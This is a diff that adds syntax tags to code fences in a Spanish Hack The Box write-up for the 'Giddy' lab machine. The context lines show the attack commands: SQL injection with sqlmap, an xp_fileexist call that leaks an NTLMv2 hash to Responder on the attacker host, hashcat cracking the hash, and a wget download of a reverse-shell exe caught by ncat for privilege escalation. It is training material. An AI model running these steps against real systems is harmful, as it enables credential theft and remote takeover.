@@ -25,7 +25,7 @@ Su tarjeta de presentación es:
 
 Comenzamos por realizar un escaneo de puertos usando nuestra herramienta nmap, pero luego vemos que tardaría bastante porque empezó a tener muchos drops:
 
-```
+``` text
 root@laptop:~# nmap -sS -p- -n --open -v 10.10.10.104
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 08:55 CST
 Initiating Ping Scan at 08:55
@@ -50,7 +50,7 @@ Increasing send delay for 10.10.10.104 from 20 to 40 due to 11 out of 22 dropped
 
 Logramos identificar al menos tres puertos. Realicemos el escaneo ahora con masscan:
 
-```
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.104
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-15 03:07:13 GMT
@@ -69,7 +69,7 @@ Como podemos ver, tenemos abiertos los mismos puertos que nmap descubrió más u
 
 Lanzamos un nmap ahora con destino a los 4 puertos descubiertos:
 
-```
+``` text
 root@laptop:~# nmap -p80,443,3389,5985 -A -T4 10.10.10.104
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-14 21:48 CST
 Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
@@ -129,7 +129,7 @@ Continuemos por analizar el servicio HTTP y HTTPS.
 
 Comenzamos por realizar una petición http al servidor:
 
-```
+``` text
 xbytemx@laptop:~/htb/giddy$ http 10.10.10.104
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -184,7 +184,7 @@ Busquemos más sobre estos servicios web.
 
 Ejecutamos gobuster con los parámetros tradicionales y menos extensos, pero se omiten los errores de conexión para no llenar de spam:
 
-```
+``` text
 xbytemx@laptop:~/htb/friendzone$ ~/tools/gobuster -u http://10.10.10.104/ -w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.tx
 t -t 20 -x php,html,txt
 
@@ -219,7 +219,7 @@ La primera resulta ser el portal de acceso remoto sobre powershell, mientras que
 
 Iniciamos usando sqlmap sin opciones para analizar el resultado:
 
-```
+``` text
 xbytemx@laptop:~$ sqlmap -u "http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18"
         ___
        __H__
@@ -310,7 +310,7 @@ Lo siguiente que hice fue sacar a los usuarios, las tablas y los passwords, lo r
 
 `sqlmap -u "http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18" --table --users --passwords`
 
-```
+``` text
 [11:58:04] [INFO] fetching database users
 [11:58:04] [INFO] used SQL query returns 3 entries
 [11:58:05] [INFO] retrieved: 'BUILTIN\\Users'
@@ -399,7 +399,7 @@ Esto me genero la idea de que si era posible lanzar xp\_dirtree o xp\_fileexist 
 
 Iniciamos por abrir en una consola Responder con `python Responder.py -wrf -I tun0`. En otra consola iniciamos sqlmap en modo sql-shell y ejecutamos el exec:
 
-```
+``` text
 xbytemx@laptop:~$ sqlmap -u "http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18" --sql-shell
         ___
        __H__
@@ -450,7 +450,7 @@ exec master..xp_fileexist '\\10.10.13.121\miau'-- -:    'NULL'
 
 En nuestra consola de responder veremos:
 
-```
+``` text
 [+] Listening for events...
 [SMB] NTLMv2-SSP Client   : 10.10.10.104
 [SMB] NTLMv2-SSP Username : GIDDY\Stacy
@@ -466,7 +466,7 @@ Yei, ya tenemos el hash del usuario stacy. Ahora pasemos a romper la hash.
 
 Usando Hashcat, rompemos la hash que acabamos de obtener. El diccionario usado fue rockyou.
 
-```
+``` text
 xbytemx@laptop:~$ hashcat -a 0 -m 5600 "Stacy::GIDDY:1122334455667788:B9F9548A74894D13A0FC9DCCAD19ED75:0101000000000000300341DE69C5D401E59EA796893B59570000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000E520622AF481D040F54B36E7D48F871AAABD6B2FEF077311B50C0859DD35C8A90A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310033002E003100320031000000000000000000" ~/wl/rockyou.txt
 ...
 STACY::GIDDY:1122334455667788:b9f9548a74894d13a0fc9dccad19ed75:0101000000000000300341de69c5d401e59ea796893b59570000000002000a0053004d0042003100320001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d004200310032000800300030000000000000000000000000300000e520622af481d040f54b36e7d48f871aaabd6b2fef077311b50c0859dd35c8a90a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310033002e003100320031000000000000000000:xNnWo6272k7x
@@ -505,7 +505,7 @@ Un poco mas de información al respecto puede ser consultado [aquí](https://blo
 
 Comenzamos por descargar y ejecutar la instancia:
 
-```
+``` text
 xbytemx@laptop:~/htb/giddy$ docker run -it quickbreach/powershell-ntlm
 Unable to find image 'quickbreach/powershell-ntlm:latest' locally
 latest: Pulling from quickbreach/powershell-ntlm
@@ -527,7 +527,7 @@ PS />
 
 Ahora generamos las credenciales y probaremos una conexión al servidor:
 
-```
+``` text
 PS /> $creds = Get-Credential
 
 PowerShell credential request
@@ -562,7 +562,7 @@ Cualquier usuario que pueda escribir en "C:\ProgramData\unifi-video\" y que pued
 
 Primero verificamos que la versión instalada es vulnerable, buscando el archivo de configuración dentro de la carpeta "C:\ProgramData\unifi-video\":
 
-```
+``` text
 [10.10.10.104]: PS C:\Users\Stacy> cd c:\programdata\unifi-video\
 [10.10.10.104]: PS C:\programdata\unifi-video> dir
 
@@ -615,7 +615,7 @@ Como podemos ver, la versión 3.7.3 es vulnerable.
 
 Iniciamos por ver como carajos se llama el servicio, esta parte requirió de pasar un rato revisando notas en github, pero finalmente llegue a la opción necesaria:
 
-```
+``` text
 [10.10.10.104]: PS C:\programdata\unifi-video> Get-ChildItem -recurse HKLM:\SYSTEM\CurrentControlSet\Services | findstr -i "unifi"
                                Microsoft-Windows-Unified-Telemetry-Client           :
                                Microsoft-Windows-Unified-Telemetry-Client           :
@@ -637,7 +637,7 @@ En el código solo modificamos los parámetros de host y port y compilamos.
 
 La función main queda así:
 
-```
+``` c
 int main(int argc, char **argv) {
     FreeConsole();
     if (argc == 3) {
@@ -660,19 +660,19 @@ Compilamos:
 Abrimos una ncat para esperar la conexión, ejecutamos el modulo de python para iniciar un servidor web y descargamos el archivo:
 
 Shell1:
-```
+``` text
 [10.10.10.104]: PS C:\programdata\unifi-video> wget http://10.10.13.121:4001/r.exe -O taskkill.exe
 ```
 
 Shell2:
-```
+``` text
 xbytemx@laptop:~/htb/giddy/www$ python -m SimpleHTTPServer 4001
 Serving HTTP on 0.0.0.0 port 4001 ...
 10.10.10.104 - - [16/Feb/2019 01:24:09] "GET /r.exe HTTP/1.1" 200 -
 ```
 
 Shell3:
-```
+``` text
 xbytemx@laptop:~/htb/giddy$ ncat -vnlp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -684,7 +684,7 @@ Ncat: Listening on 0.0.0.0:3001
 Ahora solo necesitamos detener el servicio UniFiVideoService y esperar en Shell3:
 
 Shell1:
-```
+``` text
 [10.10.10.104]: PS C:\programdata\unifi-video> stop-service UniFiVideoService
 WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
 WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
@@ -698,7 +698,7 @@ WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop.
 ```
 
 Shell3:
-```
+``` text
 xbytemx@laptop:~/htb/giddy$ ncat -vnlp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
